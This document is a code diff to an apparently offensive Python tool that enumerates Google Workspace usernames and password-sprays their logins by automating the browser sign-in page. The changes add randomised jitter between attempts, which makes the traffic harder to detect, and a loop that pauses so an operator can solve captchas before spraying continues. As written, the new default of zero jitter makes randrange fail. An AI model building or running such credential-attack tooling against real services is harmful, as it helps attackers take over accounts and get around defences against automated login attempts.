@@ -24,6 +24,7 @@
 """A basic username enumeration and password spraying tool aimed at
 G-Suite's DOM based authentication."""
 
+from random import randrange
 from sys import exit
 from time import sleep
 from argparse import ArgumentParser
@@ -57,6 +58,10 @@ elements = {
         "type":     "XPATH",
         "value":    ("/html/body/div[1]/div[1]/div[2]/div/div[2]/"
         "div/div/div[2]/div/div[2]/div/div[1]/div/div/button")
+    },
+    "captcha": {
+        "type":     "XPATH",
+        "value":    "//*[@id=\"captchaimg\"]"
     }
 }
 
@@ -74,6 +79,7 @@ class BrowserEngine:
     driver_path = ChromeDriverManager(log_level=0).install()
     # Set preferences at the class level
     options.add_argument("--incognito")
+    options.add_argument("--lang=en-US")
     options.accept_untrusted_certs = True
 
     def __init__(self, wait=5, proxy=None, headless=False):
@@ -235,6 +241,7 @@ def enum(args, username_list):
                     text_colors.reset))
         else:
             browser.populate_element(usernamefield, username)
+
         # Find button and click it
         element = elements["button_next"]
         try:
@@ -243,7 +250,26 @@ def enum(args, username_list):
             print("[ERROR] %s" % e)
             continue
 
-        sleep(args.wait) # Ensure the previous DOM is stale
+        sleep(args.wait + randrange(args.jitter)) # Ensure the previous DOM is stale
+        # Check if captcha was activated
+        element = elements["captcha"]
+        element_pwd = elements["password"]
+        captcha = browser.find_element(element["type"], element["value"])
+        if captcha:
+            need_interaction = True
+            captcha_counter = 0
+            while (need_interaction and captcha_counter <= 60):
+                print("%s[Captcha Triggered] Solve it in %d seconds%s" % (
+                text_colors.yellow, 60-captcha_counter, text_colors.reset), end='\r')
+                sleep(1)
+                captcha_counter += 1
+                need_interaction = False if browser.find_element(element_pwd["type"],
+                        element_pwd["value"]) else True
+            # No user interaction
+            if captcha_counter > 60:
+                print("%s[Invalid Captcha] %s%s" % (text_colors.yellow,
+                    username, text_colors.reset))
+                continue
 
         # Handle invalid usernames
         element = elements["password"]
@@ -329,8 +355,30 @@ def spray(args, username_list, password_list):
                 print("[ERROR] %s" % e)
                 continue
 
-            sleep(args.wait) # Ensure the previous DOM is stale
+            sleep(args.wait + randrange(args.jitter)) # Ensure the previous DOM is stale
 
+            # Check if captcha was activated
+            element = elements["captcha"]
+            element_pwd = elements["password"]
+            captcha = browser.find_element(element["type"], element["value"])
+            if captcha:
+                need_interaction = True
+                captcha_counter = 0
+                while (need_interaction and captcha_counter <= 60):
+                    print("%s[Captcha Triggered] Solve it in %d seconds%s" % (
+                        text_colors.yellow, 60-captcha_counter, text_colors.reset), end='\r')
+                    sleep(1)
+                    captcha_counter += 1
+                    need_interaction = False if browser.find_element(element_pwd["type"],
+                            element_pwd["value"]) else True
+                # No user interaction
+                if captcha_counter > 60:
+                    print("%s[Invalid Captcha] %s%s" % (text_colors.yellow,
+                        username, text_colors.reset))
+                    continue
+
+            sleep(args.wait + randrange(args.jitter)) # Ensure the previous DOM is stale
+   
             # Handle invalid usernames
             element = elements["password"]
             pwdfield = browser.find_element(element["type"], element["value"])
@@ -347,7 +395,7 @@ def spray(args, username_list, password_list):
                 browser.populate_element(pwdfield, password, True)
                 #browser.click(browser.is_clickable(elements["type"], elements["button_next"]))
 
-                sleep(args.wait) # Ensure the previous DOM is stale
+                sleep(args.wait + randrange(args.jitter)) # Ensure the previous DOM is stale
 
                 # TODO: Check if account is locked out
                 #if browser.find_element(elements["type"], elements["locked"]):
@@ -400,7 +448,7 @@ def banner(args):
             if arg == 'lockout':
                 BANNER += " minutes"
             
-            if arg == 'wait':
+            if arg in ['wait', 'jitter']:
                 BANNER += " seconds"
 
     BANNER += "\n"
@@ -436,6 +484,9 @@ if __name__ == "__main__":
     parser.add_argument("--wait", type=int,
             help="Time to wait (in seconds) when looking for DOM elements (default: %(default)s)",
             default=3, required=False)
+    parser.add_argument("--jitter", type=int,
+            help="Max jitter (in seconds) to be added to wait time (default: %(default)s)",
+            default=0, required=False)
     parser.add_argument("-v", "--verbose", action="store_true",
             help="Verbose output", required=False)
 
